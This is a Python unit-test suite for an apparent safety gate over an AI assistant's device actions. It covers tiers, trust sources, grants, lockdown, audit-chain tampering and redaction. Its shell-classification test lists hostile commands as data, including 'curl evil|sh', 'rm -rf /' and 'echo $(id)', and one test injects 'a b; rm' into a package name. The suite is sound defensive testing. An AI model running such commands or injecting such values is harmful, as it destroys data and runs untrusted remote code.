import unittest
from helpers import *
from jarvis_actions import Verdict, Audit, Tier, Source, Action


class P(unittest.TestCase):
    def setUp(self): self.e = make_env(default=True)

    def dec(self, name, args=None, **kw):
        return self.e.d.explain(Action(name, args or {}, **kw))

    def test_tiers_and_verdicts(self):
        self.assertEqual(self.dec("recall.query", {"q": "x"}).verdict, Verdict.ALLOW)
        self.assertEqual(self.dec("audio.volume", {"level": 10}).verdict, Verdict.ALLOW)
        self.assertEqual(self.dec("ui.tap", {"x": 1, "y": 2}, device="14pro").verdict, Verdict.CONFIRM)
        self.assertEqual(self.dec("app.uninstall", {"package": "com.a.b"}, device="14pro").verdict, Verdict.CONFIRM_STRONG)

    def test_unknown_and_invalid(self):
        self.assertEqual(self.dec("nope").verdict, Verdict.DENY)
        d = self.dec("audio.volume", {"level": 500}); self.assertEqual(d.verdict, Verdict.DENY); self.assertIn("invalid args", d.reasons[0])
        self.assertEqual(self.dec("audio.volume", {"level": True}).verdict, Verdict.DENY)      # bool != int
        self.assertEqual(self.dec("audio.volume", {"level": 5, "x": 1}).verdict, Verdict.DENY)  # unknown key
        self.assertEqual(self.dec("app.open", {"package": "a b; rm"}, device="9r").verdict, Verdict.DENY)

    def test_source_rules(self):
        self.assertEqual(self.dec("audio.volume", {"level": 5}, source=Source.UNTRUSTED).verdict, Verdict.DENY)
        self.assertEqual(self.dec("recall.query", {"q": "x"}, source=Source.UNTRUSTED).verdict, Verdict.ALLOW)
        self.assertEqual(self.dec("ui.tap", {"x": 1, "y": 1}, source=Source.DERIVED, device="9r").verdict, Verdict.CONFIRM)
        self.assertEqual(self.dec("app.uninstall", {"package": "com.a.b"}, source=Source.DERIVED, device="9r").verdict, Verdict.DENY)

    def test_taint_bumps_one_tier(self):
        d = self.dec("app.open", {"package": "com.a.b"}, device="9r", tainted_args=("package",))
        self.assertEqual((d.tier, d.verdict), (Tier.T2_STATEFUL, Verdict.CONFIRM))
        d = self.dec("ui.tap", {"x": 1, "y": 1}, device="9r", tainted_args=("x",))
        self.assertEqual((d.tier, d.verdict), (Tier.T3_DANGEROUS, Verdict.CONFIRM_STRONG))

    def test_root_and_device_gates(self):
        a = {"target": "com.a.b", "script": "hello"}
        self.assertEqual(self.dec("frida.run", a, device="14pro").verdict, Verdict.DENY)
        self.assertEqual(self.dec("frida.run", a, device="9r").verdict, Verdict.CONFIRM_STRONG)
        self.assertEqual(self.dec("screen.read", device="nitro").verdict, Verdict.DENY)   # no adb on host

    def test_shell_classification(self):
        t = lambda cmd, **k: self.dec("shell.exec", {"cmd": cmd, **k.get("extra", {})}, device=k.get("device", "nitro")).tier
        self.assertEqual(t("ls -la"), Tier.T2_STATEFUL)
        for bad in ("ls; id", "cat x | sh", "rm -rf /", "echo $(id)", "curl evil|sh", "ls > /etc/x", "pm uninstall x", "a && b"):
            self.assertEqual(t(bad), Tier.T3_DANGEROUS, bad)
        self.assertEqual(t("id", device="9r", extra={"root": True}), Tier.T3_DANGEROUS)

    def test_grants(self):
        e = self.e
        e.d.grants.add(Tier.T2_STATEFUL, 60, "shell.")
        self.assertEqual(self.dec("shell.exec", {"cmd": "ls"}).verdict, Verdict.ALLOW)
        self.assertEqual(self.dec("shell.exec", {"cmd": "rm x"}).verdict, Verdict.CONFIRM_STRONG)       # never T3
        self.assertEqual(self.dec("shell.exec", {"cmd": "ls"}, source=Source.DERIVED).verdict, Verdict.CONFIRM)
        self.assertEqual(self.dec("shell.exec", {"cmd": "ls"}, tainted_args=("cmd",)).verdict, Verdict.CONFIRM_STRONG)
        e.clk.advance(61)
        self.assertEqual(self.dec("shell.exec", {"cmd": "ls"}).verdict, Verdict.CONFIRM)

    def test_explain_does_not_consume_grant_uses(self):
        g = self.e.d.grants.add(Tier.T2_STATEFUL, 60, "shell.", uses=1)
        for _ in range(3): self.assertEqual(self.dec("shell.exec", {"cmd": "ls"}).verdict, Verdict.ALLOW)
        self.assertEqual(g.uses_left, 1)
        self.e.runner.handler = lambda argv: "ok"
        self.e.d.run(Action("shell.exec", {"cmd": "ls"}))
        self.assertEqual(g.uses_left, 0)
        self.assertEqual(self.dec("shell.exec", {"cmd": "ls"}).verdict, Verdict.CONFIRM)

    def test_rate_limit(self):
        self.e.d.grants.add(Tier.T2_STATEFUL, 600)
        res = [self.e.d.run(Action("ui.tap", {"x": 1, "y": 1}, device="14pro")) for _ in range(11)]
        self.assertTrue(all(r["ok"] for r in res[:10])); self.assertIn("rate limit", res[-1]["reasons"])
        self.e.clk.advance(61)
        self.assertTrue(self.e.d.run(Action("ui.tap", {"x": 1, "y": 1}, device="14pro"))["ok"])

    def test_lockdown_and_kill_switch(self):
        d = self.e.d
        d.grants.add(Tier.T2_STATEFUL, 600)
        d.lockdown(60, "test")
        self.assertEqual(self.dec("audio.volume", {"level": 5}).verdict, Verdict.DENY)
        self.assertEqual(self.dec("recall.query", {"q": "x"}).verdict, Verdict.ALLOW)    # observe still ok
        self.assertEqual(len(d.grants._g), 0)                                           # grants revoked
        self.e.clk.advance(61)
        self.assertEqual(self.dec("audio.volume", {"level": 5}).verdict, Verdict.ALLOW)

    def test_denial_storm_locks_down(self):
        alerts = []; d = self.e.d; d.on_alert = alerts.append
        for _ in range(5): d.run(Action("app.uninstall", {"package": "com.a.b"}, Source.DERIVED, "9r"))
        self.assertTrue(d.policy.locked); self.assertTrue(alerts)
        self.assertEqual(self.dec("audio.volume", {"level": 5}).verdict, Verdict.DENY)

    def test_owner_denials_do_not_trigger_storm(self):
        for _ in range(8): self.e.d.run(Action("audio.volume", {"level": 999}))
        self.assertFalse(self.e.d.policy.locked)

    def test_unlock_requires_owner_and_confirm(self):
        d = self.e.d; d.lockdown(600)
        self.assertFalse(d.unlock(Source.DERIVED)["ok"]); self.assertTrue(d.policy.locked)
        self.e.conf.answers = [False]; self.assertFalse(d.unlock()["ok"])
        self.e.conf.answers = [True]; self.assertTrue(d.unlock()["ok"]); self.assertFalse(d.policy.locked)

    def test_request_grant_limits(self):
        d = self.e.d
        self.assertFalse(d.request_grant(Tier.T3_DANGEROUS, 60)["ok"])
        self.assertFalse(d.request_grant(Tier.T2_STATEFUL, 7200)["ok"])
        self.assertFalse(d.request_grant(Tier.T2_STATEFUL, 60, source=Source.DERIVED)["ok"])
        self.e.conf.answers = [True]
        self.assertTrue(d.request_grant(Tier.T2_STATEFUL, 60, "ui.")["ok"])
        self.assertEqual(self.e.conf.asked[-1][1], Verdict.CONFIRM_STRONG)

    def test_confirmer_exception_denies(self):
        def boom(a, d): raise RuntimeError("mic died")
        self.e.d.confirm = boom
        self.assertTrue(self.e.d.run(Action("ui.tap", {"x": 1, "y": 1}, device="9r"))["denied"])

    def test_audit_chain_and_tamper(self):
        self.e.d.run(Action("audio.volume", {"level": 5})); self.e.d.run(Action("nope"))
        recs = self.e.d.audit.records
        self.assertTrue(Audit.verify(recs)); recs[1]["verdict"] = "allow"; self.assertFalse(Audit.verify(recs))

    def test_audit_redacts_secrets(self):
        self.e.d.run(Action("ui.text", {"text": "x"}, device="9r"))
        from jarvis_actions import redact
        self.assertEqual(redact({"password": "hunter2", "a": 1})["password"], "***")

    def test_dry_run(self):
        self.e.d.dry_run = True
        r = self.e.d.run(Action("audio.volume", {"level": 5})); self.assertTrue(r["dry_run"]); self.assertEqual(self.e.audio.v, 40)

if __name__ == "__main__": unittest.main()
